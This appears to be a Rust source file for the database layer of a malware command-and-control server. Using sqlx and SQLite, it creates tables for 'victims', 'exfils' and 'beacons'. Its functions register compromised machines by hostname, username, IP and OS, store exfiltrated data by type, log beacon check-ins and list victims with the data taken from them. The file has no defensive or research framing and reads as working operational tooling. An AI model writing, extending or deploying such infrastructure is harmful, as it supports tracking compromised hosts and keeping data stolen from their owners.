use sqlx::{SqlitePool, sqlite::SqlitePoolOptions, Row};
use crate::models::{Victim, ExfilData, Beacon};
use anyhow::Result;
use chrono::{Utc, DateTime};
use uuid::Uuid;

#[derive(Clone)]
pub struct Database {
    pool: SqlitePool,
}

impl Database {
    pub async fn new(db_path: &str) -> Result<Self> {
        let pool = SqlitePoolOptions::new()
            .max_connections(5)
            .connect(&format!("sqlite:{}", db_path))
            .await?;
        
        // Create tables if not exists
        sqlx::query(
            r#"
            CREATE TABLE IF NOT EXISTS victims (
                id TEXT PRIMARY KEY,
                machine_name TEXT NOT NULL,
                username TEXT NOT NULL,
                ip_address TEXT NOT NULL,
                first_seen DATETIME NOT NULL,
                last_seen DATETIME NOT NULL,
                os_version TEXT,
                total_exfils INTEGER DEFAULT 0
            )
            "#
        )
        .execute(&pool)
        .await?;
        
        sqlx::query(
            r#"
            CREATE TABLE IF NOT EXISTS exfils (
                id TEXT PRIMARY KEY,
                victim_id TEXT NOT NULL,
                data_type TEXT NOT NULL,
                data TEXT NOT NULL,
                timestamp DATETIME NOT NULL,
                size INTEGER,
                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
            )
            "#
        )
        .execute(&pool)
        .await?;
        
        sqlx::query(
            r#"
            CREATE TABLE IF NOT EXISTS beacons (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                timestamp DATETIME NOT NULL,
                status TEXT,
                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
            )
            "#
        )
        .execute(&pool)
        .await?;
        
        Ok(Self { pool })
    }
    
    pub async fn register_victim(
        &self,
        machine_name: &str,
        username: &str,
        ip_address: &str,
        os_version: Option<&str>,
    ) -> Result<String> {
        let id = Uuid::new_v4().to_string();
        let now = Utc::now();
        
        sqlx::query(
            r#"
            INSERT INTO victims (id, machine_name, username, ip_address, first_seen, last_seen, os_version, total_exfils)
            VALUES (?, ?, ?, ?, ?, ?, ?, 0)
            "#
        )
        .bind(&id)
        .bind(machine_name)
        .bind(username)
        .bind(ip_address)
        .bind(now)
        .bind(now)
        .bind(os_version)
        .execute(&self.pool)
        .await?;
        
        Ok(id)
    }
    
    pub async fn update_victim_last_seen(&self, victim_id: &str) -> Result<()> {
        sqlx::query(
            r#"
            UPDATE victims 
            SET last_seen = ? 
            WHERE id = ?
            "#
        )
        .bind(Utc::now())
        .bind(victim_id)
        .execute(&self.pool)
        .await?;
        
        Ok(())
    }
    
    pub async fn add_exfil(
        &self,
        victim_id: &str,
        data_type: &str,
        data: &str,
    ) -> Result<String> {
        let id = Uuid::new_v4().to_string();
        let now = Utc::now();
        let size = data.len() as i32;
        
        sqlx::query(
            r#"
            INSERT INTO exfils (id, victim_id, data_type, data, timestamp, size)
            VALUES (?, ?, ?, ?, ?, ?)
            "#
        )
        .bind(&id)
        .bind(victim_id)
        .bind(data_type)
        .bind(data)
        .bind(now)
        .bind(size)
        .execute(&self.pool)
        .await?;
        
        // Increment total_exfils counter
        sqlx::query(
            r#"
            UPDATE victims 
            SET total_exfils = total_exfils + 1 
            WHERE id = ?
            "#
        )
        .bind(victim_id)
        .execute(&self.pool)
        .await?;
        
        Ok(id)
    }
    
    pub async fn add_beacon(
        &self,
        victim_id: &str,
        status: &str,
    ) -> Result<()> {
        sqlx::query(
            r#"
            INSERT INTO beacons (victim_id, timestamp, status)
            VALUES (?, ?, ?)
            "#
        )
        .bind(victim_id)
        .bind(Utc::now())
        .bind(status)
        .execute(&self.pool)
        .await?;
        
        // Update last_seen
        self.update_victim_last_seen(victim_id).await?;
        
        Ok(())
    }
    
    pub async fn list_victims(&self) -> Result<Vec<Victim>> {
        let rows = sqlx::query(
            r#"
            SELECT id, machine_name, username, ip_address, first_seen, last_seen, 
                   COALESCE(os_version, 'Unknown') as os_version, total_exfils
            FROM victims
            ORDER BY last_seen DESC
            "#
        )
        .fetch_all(&self.pool)
        .await?;
        
        let mut victims = Vec::new();
        for row in rows {
            victims.push(Victim {
                id: row.get(0),
                machine_name: row.get(1),
                username: row.get(2),
                ip_address: row.get(3),
                first_seen: row.get(4),
                last_seen: row.get(5),
                os_version: row.get(6),
                total_exfils: row.get(7),
            });
        }
        
        Ok(victims)
    }
    
    pub async fn get_victim_exfils(&self, victim_id: &str) -> Result<Vec<ExfilData>> {
        let rows = sqlx::query(
            r#"
            SELECT id, victim_id, data_type, data, timestamp
            FROM exfils
            WHERE victim_id = ?
            ORDER BY timestamp DESC
            "#
        )
        .bind(victim_id)
        .fetch_all(&self.pool)
        .await?;
        
        let mut exfils = Vec::new();
        for row in rows {
            exfils.push(ExfilData {
                victim_id: row.get(1),
                machine_name: "".to_string(),
                username: "".to_string(),
                ip_address: "".to_string(),
                data_type: row.get(2),
                data: row.get(3),
                timestamp: row.get(4),
            });
        }
        
        Ok(exfils)
    }
    
    pub async fn get_exfil_by_id(&self, id: &str) -> Result<Option<ExfilData>> {
        let row = sqlx::query(
            r#"
            SELECT e.id, e.victim_id, e.data_type, e.data, e.timestamp,
                   v.machine_name, v.username, v.ip_address
            FROM exfils e
            JOIN victims v ON e.victim_id = v.id
            WHERE e.id = ?
            "#
        )
        .bind(id)
        .fetch_optional(&self.pool)
        .await?;
        
        if let Some(row) = row {
            Ok(Some(ExfilData {
                victim_id: row.get(1),
                machine_name: row.get(5),
                username: row.get(6),
                ip_address: row.get(7),
                data_type: row.get(2),
                data: row.get(3),
                timestamp: row.get(4),
            }))
        } else {
            Ok(None)
        }
    }
}